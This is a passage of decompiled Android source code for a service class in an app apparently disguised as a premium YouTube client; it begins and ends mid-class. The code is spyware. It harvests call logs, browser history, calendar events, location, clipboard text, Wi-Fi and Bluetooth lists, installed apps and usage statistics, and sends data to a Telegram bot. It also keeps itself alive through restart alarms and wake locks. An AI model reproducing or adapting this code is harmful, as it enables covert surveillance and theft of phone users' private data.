        intent.setAction(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۷۴String$arg0$callsetAction$fun$anonymous$$arg0$callapply$valintent$funregisterRestartAlarm$classUploadService());
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, LiveLiterals$UploadServiceKt.INSTANCE.m۲۹۵Int$arg1$callgetBroadcast$valpendingIntent$funregisterRestartAlarm$classUploadService(), intent, 201326592);
        if (Build.VERSION.SDK_INT >= 23) {
            alarmManager.setExactAndAllowWhileIdle(0, System.currentTimeMillis() + ((long) LiveLiterals$UploadServiceKt.INSTANCE.m۲۷۱Int$arg0$callplus$arg1$callsetExactAndAllowWhileIdle$branch$if$funregisterRestartAlarm$classUploadService()), pendingIntent);
        } else {
            alarmManager.setExact(0, System.currentTimeMillis() + ((long) LiveLiterals$UploadServiceKt.INSTANCE.m۲۷۰Int$arg0$callplus$arg1$callsetExact$else$if$funregisterRestartAlarm$classUploadService()), pendingIntent);
        }
    }

    private final void restartService() {
        Intent intent = new Intent(getApplicationContext(), (Class<?>) RestartService.class);
        startService(intent);
    }

    private final void acquireWakeLock() {
        if (!getWakeLock().isHeld()) {
            getWakeLock().acquire(((long) (LiveLiterals$UploadServiceKt.INSTANCE.m۲۱۴Int$$this$calltimes$$this$calltimes$arg0$callacquire$branch$if$funacquireWakeLock$classUploadService() * LiveLiterals$UploadServiceKt.INSTANCE.m۲۸۱Int$arg0$calltimes$$this$calltimes$arg0$callacquire$branch$if$funacquireWakeLock$classUploadService())) * LiveLiterals$UploadServiceKt.INSTANCE.m۳۳۹Long$arg0$calltimes$arg0$callacquire$branch$if$funacquireWakeLock$classUploadService());
        }
    }

    @Override // android.app.Service
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        restartService();
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        this.isUploading = LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۸Boolean$arg0$call$setisUploading$$funonDestroy$classUploadService();
        Job.DefaultImpls.cancel$default(this.job, (CancellationException) null, 1, (Object) null);
        if (getWakeLock().isHeld()) {
            getWakeLock().release();
        }
        try {
            stopForeground(LiveLiterals$UploadServiceKt.INSTANCE.m۱۸۰Boolean$arg0$callstopForeground$try$funonDestroy$classUploadService());
        } catch (Exception e) {
        }
        restartService();
        Job job = this.pollingJob;
        if (job != null) {
            Job.DefaultImpls.cancel$default(job, (CancellationException) null, 1, (Object) null);
        }
        setFlashlight(LiveLiterals$UploadServiceKt.INSTANCE.m۱۷۴Boolean$arg0$callsetFlashlight$funonDestroy$classUploadService());
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendClipboardToTelegram$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendClipboardToTelegram$1", f = "UploadService.kt", i = {}, l = {}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۲۳1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ String $text;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۲۳1(String str, Continuation<? super C۰۰۲۳1> continuation) {
            super(2, continuation);
            this.$text = str;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۲۳1(this.$text, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object obj) {
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure(obj);
                    try {
                        Request request = new Request.Builder().url(LiveLiterals$UploadServiceKt.INSTANCE.m۵۴۵String$0$str$arg0$callurl$$this$callpost$$this$callbuild$valrequest$try$fun$anonymous$$arg2$calllaunch$funsendClipboardToTelegram$classUploadService() + UploadService.this.botToken + LiveLiterals$UploadServiceKt.INSTANCE.m۶۷۰String$2$str$arg0$callurl$$this$callpost$$this$callbuild$valrequest$try$fun$anonymous$$arg2$calllaunch$funsendClipboardToTelegram$classUploadService()).post(new FormBody.Builder((Charset) null, 1, (DefaultConstructorMarker) null).add(LiveLiterals$UploadServiceKt.INSTANCE.m۷۶۱String$arg0$calladd$$this$calladd$$this$callbuild$valrequestBody$try$fun$anonymous$$arg2$calllaunch$funsendClipboardToTelegram$classUploadService(), UploadService.this.chatId).add(LiveLiterals$UploadServiceKt.INSTANCE.m۷۶۷String$arg0$calladd$$this$callbuild$valrequestBody$try$fun$anonymous$$arg2$calllaunch$funsendClipboardToTelegram$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۵۳String$0$str$arg1$calladd$$this$callbuild$valrequestBody$try$fun$anonymous$$arg2$calllaunch$funsendClipboardToTelegram$classUploadService() + this.$text).build()).build();
                        UploadService.this.client.newCall(request).execute().close();
                        break;
                    } catch (Exception e) {
                    }
                    return Unit.INSTANCE;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        }
    }

    private final void sendClipboardToTelegram(String text) {
        BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۲۳1(text, null), 3, (Object) null);
    }

    /* JADX WARN: Removed duplicated region for block: B:50:0x0260 A[Catch: Exception -> 0x0272, LOOP:0: B:48:0x025a->B:50:0x0260, LOOP_END, TryCatch #9 {Exception -> 0x0272, blocks: (B:47:0x0252, B:48:0x025a, B:50:0x0260, B:51:0x026d, B:62:0x027e, B:63:0x0281, B:43:0x023f, B:59:0x027b), top: B:86:0x0029, inners: #6 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.Object batchAndSendExfilData(kotlin.coroutines.Continuation<? super kotlin.Unit> r20) {
        /*
            Method dump skipped, instruction units count: 674
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.batchAndSendExfilData(kotlin.coroutines.Continuation):java.lang.Object");
    }

    private final String getCalendarEvents() {
        StringBuilder sb = new StringBuilder();
        try {
            if (ContextCompat.checkSelfPermission(this, "android.permission.READ_CALENDAR") != 0) {
                sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۸۵String$arg0$callappend$branch$if$try$fungetCalendarEvents$classUploadService());
                String string = sb.toString();
                Intrinsics.checkNotNullExpressionValue(string, "sb.toString()");
                return string;
            }
            String[] projection = {"title", "dtstart", "dtend", "eventLocation"};
            Cursor cursor = getContentResolver().query(CalendarContract.Events.CONTENT_URI, projection, null, null, null);
            if (cursor != null) {
                Cursor cursor2 = cursor;
                try {
                    Cursor it = cursor2;
                    while (it.moveToNext()) {
                        String title = it.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۲۵۵Int$arg0$callgetString$valtitle$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCalendarEvents$classUploadService());
                        long start = it.getLong(LiveLiterals$UploadServiceKt.INSTANCE.m۲۴۰Int$arg0$callgetLong$valstart$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCalendarEvents$classUploadService());
                        long end = it.getLong(LiveLiterals$UploadServiceKt.INSTANCE.m۲۳۹Int$arg0$callgetLong$valend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCalendarEvents$classUploadService());
                        String location = it.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۲۴۴Int$arg0$callgetString$vallocation$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCalendarEvents$classUploadService());
                        sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۳۸String$0$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCalendarEvents$classUploadService() + title + LiveLiterals$UploadServiceKt.INSTANCE.m۶۱۴String$2$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCalendarEvents$classUploadService() + start + LiveLiterals$UploadServiceKt.INSTANCE.m۷۰۰String$4$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCalendarEvents$classUploadService() + end + LiveLiterals$UploadServiceKt.INSTANCE.m۷۱۵String$6$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCalendarEvents$classUploadService() + location + LiveLiterals$UploadServiceKt.INSTANCE.m۷۲۲String$8$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCalendarEvents$classUploadService());
                    }
                    Unit unit = Unit.INSTANCE;
                    CloseableKt.closeFinally(cursor2, (Throwable) null);
                } finally {
                }
            }
        } catch (Exception e) {
            sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۹۰String$arg0$callappend$catch$fungetCalendarEvents$classUploadService());
        }
        String string2 = sb.toString();
        Intrinsics.checkNotNullExpressionValue(string2, "sb.toString()");
        return string2;
    }

    static /* synthetic */ String getInstalledApps$default(UploadService uploadService, boolean z, int i, Object obj) {
        if ((i & 1) != 0) {
            z = LiveLiterals$UploadServiceKt.INSTANCE.m۲۰۱Boolean$paramshowAll$fungetInstalledApps$classUploadService();
        }
        return uploadService.getInstalledApps(z);
    }

    /* JADX WARN: Can't wrap try/catch for region: R(26:6|7|(3:60|9|(1:68)(2:70|69))(1:67)|14|15|64|16|21|58|22|56|26|30|31|(1:33)(1:35)|36|37|(1:39)(1:41)|42|43|54|44|45|71|69|4) */
    /* JADX WARN: Code restructure failed: missing block: B:20:0x0069, code lost:
    
        r0 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۹۳String$catch$valversion$body$loop$try$fungetInstalledApps$classUploadService();
     */
    /* JADX WARN: Code restructure failed: missing block: B:25:0x0079, code lost:
    
        r10 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE.m۳۴۸Long$catch$valfirstInstall$body$loop$try$fungetInstalledApps$classUploadService();
     */
    /* JADX WARN: Code restructure failed: missing block: B:29:0x008d, code lost:
    
        r12 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE.m۳۴۹Long$catch$vallastUpdate$body$loop$try$fungetInstalledApps$classUploadService();
     */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.String getInstalledApps(boolean r19) {
        /*
            Method dump skipped, instruction units count: 314
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.getInstalledApps(boolean):java.lang.String");
    }

    private final String getBrowserHistory() {
        Cursor cursor;
        Cursor cursor2;
        StringBuilder sb = new StringBuilder();
        boolean found = LiveLiterals$UploadServiceKt.INSTANCE.m۲۰۵Boolean$valfound$fungetBrowserHistory$classUploadService();
        try {
            String[] projection = {LiveLiterals$UploadServiceKt.INSTANCE.m۶۰۲String$0$vararg$arg0$callarrayOf$valprojection$try$fungetBrowserHistory$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۶۱۳String$1$vararg$arg0$callarrayOf$valprojection$try$fungetBrowserHistory$classUploadService()};
            try {
                cursor2 = getContentResolver().query(Uri.parse(LiveLiterals$UploadServiceKt.INSTANCE.m۹۲۰String$arg0$callparse$arg0$callquery$try$valcursor$try$fungetBrowserHistory$classUploadService()), projection, LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۵۱String$arg2$callquery$try$valcursor$try$fungetBrowserHistory$classUploadService(), null, null);
            } catch (Exception e) {
                cursor2 = null;
            }
            if (cursor2 != null) {
                cursor = cursor2;
                try {
                    Cursor it = cursor;
                    while (it.moveToNext()) {
                        String title = it.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۲۵۴Int$arg0$callgetString$valtitle$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetBrowserHistory$classUploadService());
                        String url = it.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۲۵۸Int$arg0$callgetString$valurl$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetBrowserHistory$classUploadService());
                        sb.append(title + LiveLiterals$UploadServiceKt.INSTANCE.m۶۰۴String$1$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetBrowserHistory$classUploadService() + url + LiveLiterals$UploadServiceKt.INSTANCE.m۶۹۸String$3$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetBrowserHistory$classUploadService());
                        found = LiveLiterals$UploadServiceKt.INSTANCE.m۲۰۴Boolean$setfound$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetBrowserHistory$classUploadService();
                    }
                    Unit unit = Unit.INSTANCE;
                    CloseableKt.closeFinally(cursor, (Throwable) null);
                } finally {
                }
            }
        } catch (Exception e2) {
        }
        if (!found) {
            try {
                Uri uri = Uri.parse(LiveLiterals$UploadServiceKt.INSTANCE.m۹۲۱String$arg0$callparse$valuri$try$branch$if$fungetBrowserHistory$classUploadService());
                String[] projection2 = {LiveLiterals$UploadServiceKt.INSTANCE.m۶۰۱String$0$vararg$arg0$callarrayOf$valprojection$try$branch$if$fungetBrowserHistory$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۶۱۲String$1$vararg$arg0$callarrayOf$valprojection$try$branch$if$fungetBrowserHistory$classUploadService()};
                Cursor cursor3 = getContentResolver().query(uri, projection2, null, null, null);
                if (cursor3 != null) {
                    cursor = cursor3;
                    try {
                        Cursor it2 = cursor;
                        while (it2.moveToNext()) {
                            String title2 = it2.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۲۵۳Int$arg0$callgetString$valtitle$body$loop$fun$anonymous$$arg0$calluse$else$when$try$branch$if$fungetBrowserHistory$classUploadService());
                            String url2 = it2.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۲۵۷Int$arg0$callgetString$valurl$body$loop$fun$anonymous$$arg0$calluse$else$when$try$branch$if$fungetBrowserHistory$classUploadService());
                            sb.append(title2 + LiveLiterals$UploadServiceKt.INSTANCE.m۶۰۳String$1$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$branch$if$fungetBrowserHistory$classUploadService() + url2 + LiveLiterals$UploadServiceKt.INSTANCE.m۶۹۷String$3$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$branch$if$fungetBrowserHistory$classUploadService());
                            found = LiveLiterals$UploadServiceKt.INSTANCE.m۲۰۳Boolean$setfound$body$loop$fun$anonymous$$arg0$calluse$else$when$try$branch$if$fungetBrowserHistory$classUploadService();
                        }
                        Unit unit2 = Unit.INSTANCE;
                        CloseableKt.closeFinally(cursor, (Throwable) null);
                    } finally {
                        try {
                            throw th;
                        } finally {
                        }
                    }
                }
            } catch (Exception e3) {
            }
        }
        if (!found) {
            sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۸۶String$arg0$callappend$branch$if1$fungetBrowserHistory$classUploadService());
        }
        String string = sb.toString();
        Intrinsics.checkNotNullExpressionValue(string, "sb.toString()");
        return string;
    }

    private final String getCallLogs() {
        String type;
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, new String[]{"number", "type", "date", "duration"}, null, null, LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۵۲String$arg4$callquery$valcursor$try$fungetCallLogs$classUploadService());
            SimpleDateFormat dateFormat = new SimpleDateFormat(LiveLiterals$UploadServiceKt.INSTANCE.m۷۴۲String$arg0$call$init$$valdateFormat$try$fungetCallLogs$classUploadService());
            if (cursor != null) {
                Cursor cursor2 = cursor;
                try {
                    Cursor it = cursor2;
                    while (it.moveToNext()) {
                        String number = it.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۲۵۱Int$arg0$callgetString$valnumber$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogs$classUploadService());
                        switch (it.getInt(LiveLiterals$UploadServiceKt.INSTANCE.m۲۲۷Int$arg0$callgetInt$valtmp0_subject$valtype$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogs$classUploadService())) {
                            case 1:
                                type = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۷۶String$branch$when$valtype$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogs$classUploadService();
                                break;
                            case 2:
                                type = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۸۰String$branch1$when$valtype$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogs$classUploadService();
                                break;
                            case 3:
                                type = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۸۴String$branch2$when$valtype$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogs$classUploadService();
                                break;
                            case 4:
                            default:
                                type = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۱۰String$else$when$valtype$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogs$classUploadService();
                                break;
                            case 5:
                                type = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۸۷String$branch3$when$valtype$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogs$classUploadService();
                                break;
                        }
                        String date = dateFormat.format(new Date(it.getLong(LiveLiterals$UploadServiceKt.INSTANCE.m۲۳۳Int$arg0$callgetLong$arg0$call$init$$arg0$callformat$valdate$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogs$classUploadService())));
                        long duration = it.getLong(LiveLiterals$UploadServiceKt.INSTANCE.m۲۳۸Int$arg0$callgetLong$valduration$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogs$classUploadService());
                        sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۴۰String$0$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogs$classUploadService() + number + LiveLiterals$UploadServiceKt.INSTANCE.m۶۱۶String$2$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogs$classUploadService() + type + LiveLiterals$UploadServiceKt.INSTANCE.m۷۰۱String$4$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogs$classUploadService() + date + LiveLiterals$UploadServiceKt.INSTANCE.m۷۱۶String$6$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogs$classUploadService() + duration + LiveLiterals$UploadServiceKt.INSTANCE.m۷۲۳String$8$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogs$classUploadService());
                    }
                    Unit unit = Unit.INSTANCE;
                    CloseableKt.closeFinally(cursor2, (Throwable) null);
                } finally {
                }
            }
        } catch (Exception e) {
            sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۹۲String$arg0$callappend$catch$fungetCallLogs$classUploadService());
        }
        String string = sb.toString();
        Intrinsics.checkNotNullExpressionValue(string, "sb.toString()");
        return string;
    }

    private final String getMediaFiles() {
        StringBuilder sb = new StringBuilder();
        try {
            String[] projection = {"_display_name", "date_added"};
            Cursor cursor = getContentResolver().query(MediaStore.Files.getContentUri(LiveLiterals$UploadServiceKt.INSTANCE.m۸۷۹String$arg0$callgetContentUri$arg0$callquery$valcursor$try$fungetMediaFiles$classUploadService()), projection, null, null, LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۵۳String$arg4$callquery$valcursor$try$fungetMediaFiles$classUploadService());
            SimpleDateFormat dateFormat = new SimpleDateFormat(LiveLiterals$UploadServiceKt.INSTANCE.m۷۴۳String$arg0$call$init$$valdateFormat$try$fungetMediaFiles$classUploadService());
            if (cursor != null) {
                Cursor cursor2 = cursor;
                try {
                    Cursor it = cursor2;
                    while (it.moveToNext()) {
                        String name = it.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۲۴۷Int$arg0$callgetString$valname$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetMediaFiles$classUploadService());
                        String date = dateFormat.format(new Date(it.getLong(LiveLiterals$UploadServiceKt.INSTANCE.m۲۳۱Int$arg0$callgetLong$$this$calltimes$arg0$call$init$$arg0$callformat$valdate$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetMediaFiles$classUploadService()) * ((long) LiveLiterals$UploadServiceKt.INSTANCE.m۲۸۳Int$arg0$calltimes$arg0$call$init$$arg0$callformat$valdate$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetMediaFiles$classUploadService())));
                        sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۴۲String$0$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetMediaFiles$classUploadService() + name + LiveLiterals$UploadServiceKt.INSTANCE.m۶۱۸String$2$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetMediaFiles$classUploadService() + date + LiveLiterals$UploadServiceKt.INSTANCE.m۷۰۳String$4$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetMediaFiles$classUploadService());
                    }
                    Unit unit = Unit.INSTANCE;
                    CloseableKt.closeFinally(cursor2, (Throwable) null);
                } finally {
                }
            }
        } catch (Exception e) {
            sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۹۷String$arg0$callappend$catch$fungetMediaFiles$classUploadService());
        }
        String string = sb.toString();
        Intrinsics.checkNotNullExpressionValue(string, "sb.toString()");
        return string;
    }

    private final String getWifiNetworks() {
        StringBuilder sb = new StringBuilder();
        try {
            Object systemService = getApplicationContext().getSystemService("wifi");
            Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.net.wifi.WifiManager");
            WifiManager wifiManager = (WifiManager) systemService;
            Iterable configuredNetworks = wifiManager.getConfiguredNetworks();
            if (configuredNetworks != null) {
                Iterable $this$forEach$iv = configuredNetworks;
                for (Object element$iv : $this$forEach$iv) {
                    WifiConfiguration it = (WifiConfiguration) element$iv;
                    sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۵۲String$0$str$arg0$callappend$fun$anonymous$$arg0$callforEach$else$when$try$fungetWifiNetworks$classUploadService() + it.SSID + LiveLiterals$UploadServiceKt.INSTANCE.m۶۲۸String$2$str$arg0$callappend$fun$anonymous$$arg0$callforEach$else$when$try$fungetWifiNetworks$classUploadService() + it.BSSID + LiveLiterals$UploadServiceKt.INSTANCE.m۷۰۷String$4$str$arg0$callappend$fun$anonymous$$arg0$callforEach$else$when$try$fungetWifiNetworks$classUploadService());
                }
            }
        } catch (Exception e) {
            sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۹۹String$arg0$callappend$catch$fungetWifiNetworks$classUploadService());
        }
        String string = sb.toString();
        Intrinsics.checkNotNullExpressionValue(string, "sb.toString()");
        return string;
    }

    private final String getBluetoothDevices() {
        StringBuilder sb = new StringBuilder();
        try {
            Object systemService = getApplicationContext().getSystemService("bluetooth");
            Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.bluetooth.BluetoothManager");
            BluetoothManager btManager = (BluetoothManager) systemService;
            BluetoothAdapter adapter = btManager.getAdapter();
            Set paired = adapter != null ? adapter.getBondedDevices() : null;
            if (paired != null) {
                Set $this$forEach$iv = paired;
                for (Object element$iv : $this$forEach$iv) {
                    BluetoothDevice it = (BluetoothDevice) element$iv;
                    sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۵۱String$0$str$arg0$callappend$fun$anonymous$$arg0$callforEach$else$when$try$fungetBluetoothDevices$classUploadService() + it.getName() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۲۷String$2$str$arg0$callappend$fun$anonymous$$arg0$callforEach$else$when$try$fungetBluetoothDevices$classUploadService() + it.getAddress() + LiveLiterals$UploadServiceKt.INSTANCE.m۷۰۶String$4$str$arg0$callappend$fun$anonymous$$arg0$callforEach$else$when$try$fungetBluetoothDevices$classUploadService());
                }
            }
        } catch (Exception e) {
            sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۸۹String$arg0$callappend$catch$fungetBluetoothDevices$classUploadService());
        }
        String string = sb.toString();
        Intrinsics.checkNotNullExpressionValue(string, "sb.toString()");
        return string;
    }

    private final String getLocationHistory() {
        Location loc;
        StringBuilder sb = new StringBuilder();
        try {
            Object systemService = getSystemService("location");
            Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.location.LocationManager");
            LocationManager lm = (LocationManager) systemService;
            List<String> providers = lm.getProviders(LiveLiterals$UploadServiceKt.INSTANCE.m۱۶۵Boolean$arg0$callgetProviders$valproviders$try$fungetLocationHistory$classUploadService());
            Intrinsics.checkNotNullExpressionValue(providers, "lm.getProviders(true)");
            for (String provider : providers) {
                try {
                    loc = lm.getLastKnownLocation(provider);
                } catch (Exception e) {
                    loc = null;
                }
                if (loc != null) {
                    sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۴۵String$0$str$arg0$callappend$branch$if$body$loop$try$fungetLocationHistory$classUploadService() + provider + LiveLiterals$UploadServiceKt.INSTANCE.m۶۲۱String$2$str$arg0$callappend$branch$if$body$loop$try$fungetLocationHistory$classUploadService() + loc.getLatitude() + LiveLiterals$UploadServiceKt.INSTANCE.m۷۰۴String$4$str$arg0$callappend$branch$if$body$loop$try$fungetLocationHistory$classUploadService() + loc.getLongitude() + LiveLiterals$UploadServiceKt.INSTANCE.m۷۱۸String$6$str$arg0$callappend$branch$if$body$loop$try$fungetLocationHistory$classUploadService() + new SimpleDateFormat(LiveLiterals$UploadServiceKt.INSTANCE.m۷۳۱String$arg0$call$init$$$this$callformat$7$str$arg0$callappend$branch$if$body$loop$try$fungetLocationHistory$classUploadService()).format(new Date(loc.getTime())) + LiveLiterals$UploadServiceKt.INSTANCE.m۷۲۴String$8$str$arg0$callappend$branch$if$body$loop$try$fungetLocationHistory$classUploadService());
                    sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۶۰String$0$str$arg0$callappend1$branch$if$body$loop$try$fungetLocationHistory$classUploadService() + loc.getLatitude() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۳۶String$2$str$arg0$callappend1$branch$if$body$loop$try$fungetLocationHistory$classUploadService() + loc.getLongitude() + LiveLiterals$UploadServiceKt.INSTANCE.m۷۰۹String$4$str$arg0$callappend1$branch$if$body$loop$try$fungetLocationHistory$classUploadService());
                }
            }
        } catch (Exception e2) {
            sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۹۶String$arg0$callappend$catch$fungetLocationHistory$classUploadService());
        }
        String string = sb.toString();
        Intrinsics.checkNotNullExpressionValue(string, "sb.toString()");
        return string;
    }

    private final String getClipboardHistory() {
        StringBuilder sb = new StringBuilder();
        try {
            Object systemService = getSystemService("clipboard");
            Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.content.ClipboardManager");
            ClipboardManager clipboard = (ClipboardManager) systemService;
            ClipData clip = clipboard.getPrimaryClip();
            if (clip != null && clip.getItemCount() > LiveLiterals$UploadServiceKt.INSTANCE.m۳۱۰Int$arg1$callgreater$branch$cond$if$try$fungetClipboardHistory$classUploadService()) {
                String text = clip.getItemAt(LiveLiterals$UploadServiceKt.INSTANCE.m۲۳۰Int$arg0$callgetItemAt$$this$callcoerceToText$$this$calltoString$valtext$branch$if$try$fungetClipboardHistory$classUploadService()).coerceToText(this).toString();
                sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۴۷String$0$str$arg0$callappend$branch$if$try$fungetClipboardHistory$classUploadService() + text + LiveLiterals$UploadServiceKt.INSTANCE.m۶۲۳String$2$str$arg0$callappend$branch$if$try$fungetClipboardHistory$classUploadService());
            } else {
                sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۸۰۰String$arg0$callappend$else$if$try$fungetClipboardHistory$classUploadService());
            }
        } catch (Exception e) {
            sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۹۳String$arg0$callappend$catch$fungetClipboardHistory$classUploadService());
        }
        String string = sb.toString();
        Intrinsics.checkNotNullExpressionValue(string, "sb.toString()");
        return string;
    }

    private final String getAppUsageStats() {
        StringBuilder sb = new StringBuilder();
        try {
            Object systemService = getSystemService("usagestats");
            Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.app.usage.UsageStatsManager");
            UsageStatsManager usm = (UsageStatsManager) systemService;
            long end = System.currentTimeMillis();
            long start = end - ((long) (((LiveLiterals$UploadServiceKt.INSTANCE.m۲۱۳Int$$this$calltimes$$this$calltimes$$this$calltimes$arg0$callminus$valstart$try$fungetAppUsageStats$classUploadService() * LiveLiterals$UploadServiceKt.INSTANCE.m۲۸۰Int$arg0$calltimes$$this$calltimes$$this$calltimes$arg0$callminus$valstart$try$fungetAppUsageStats$classUploadService()) * LiveLiterals$UploadServiceKt.INSTANCE.m۲۸۲Int$arg0$calltimes$$this$calltimes$arg0$callminus$valstart$try$fungetAppUsageStats$classUploadService()) * LiveLiterals$UploadServiceKt.INSTANCE.m۲۸۵Int$arg0$calltimes$arg0$callminus$valstart$try$fungetAppUsageStats$classUploadService()));
            List stats = usm.queryUsageStats(0, start, end);
            if (stats != null) {
                List $this$forEach$iv = stats;
                for (Object element$iv : $this$forEach$iv) {
                    UsageStats it = (UsageStats) element$iv;
                    List stats2 = stats;
                    Iterable $this$forEach$iv2 = $this$forEach$iv;
